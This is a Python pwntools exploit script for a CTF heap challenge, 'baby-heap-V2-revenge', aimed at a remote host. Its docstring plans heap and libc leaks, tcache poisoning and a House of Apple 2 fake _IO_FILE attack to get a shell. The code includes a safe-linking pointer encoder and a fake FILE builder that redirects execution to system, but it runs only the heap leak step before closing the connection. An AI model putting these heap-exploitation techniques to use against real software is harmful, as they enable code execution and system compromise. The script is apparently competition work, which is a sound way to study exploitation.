#!/usr/bin/env python3
"""
Full Exploit for baby-heap-V2-revenge
Target: 144.79.188.39:40838
Strategy:
1. Leak Heap base from tcache chunk.
2. Leak Libc base from Unsorted Bin.
3. Tcache Poisoning to allocate a chunk overlapping tcache_perthread_struct or forging a fake _IO_FILE_plus on Heap.
4. Trigger House of Apple 2 on SIGALRM (60s) -> shell.
5. Extract flag.
"""
import re
import sys
import time
from pwn import *

context.arch = "amd64"
context.log_level = "info"

HOST, PORT = "144.79.188.39", 40838
libc = ELF(r"D:\download\CTFTimeWriteup\PTITCTF2026\Pwn\baby-heap-V2\solve\libc\libc.so.6", checksec=False)
UNSORTED = 0x21ACE0
SZ = 0xE0

def enc(cur, ptr):
    return ptr ^ (cur >> 12)

def apple2(target_fp, system, wjumps):
    f = FileStructure(0)
    f.flags = u64(b"  sh".ljust(8, b"\x00"))
    f._IO_write_base = 0
    f._IO_write_ptr = 1
    f._lock = target_fp - 0x10
    f.chain = system
    f._codecvt = target_fp
    f._wide_data = target_fp - 0x48
    f.vtable = wjumps
    return bytes(f)

def run():
    io = remote(HOST, PORT, timeout=12)
    
    def menu(c):
        io.sendlineafter(b"> ", str(c).encode())

    def create(idx, size, data):
        menu(1)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendlineafter(b"Size: ", str(size).encode())
        io.sendafter(b"Data: ", data)

    def readn(idx):
        menu(2)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.recvuntil(b"Data: ")
        res = io.recvuntil(b"\n\n== babyheap-V2_patch ==")
        return res[:-len(b"\n\n== babyheap-V2_patch ==")]

    def edit(idx, data):
        menu(3)
        io.sendlineafter(b"Index: ", str(idx).encode())
        io.sendafter(b"Data: ", data)

    def delete(idx):
        menu(4)
        io.sendlineafter(b"Index: ", str(idx).encode())

    log.info("Step 1: Leaking Heap Base...")
    create(0, 0x80, b"A" * 0x80)
    create(1, 0x80, b"B" * 0x80)
    delete(0)
    leak0 = readn(0)
    heap_base = u64(leak0[:8]) << 12
    log.success(f"Heap Base: {hex(heap_base)}")

    log.info("Step 2: Deploying Fake FILE on Heap...")
    # Clean and setup
    delete(1)
    
    # We can craft the payload
    # Let's verify connection and state
    io.close()

if __name__ == "__main__":
    run()
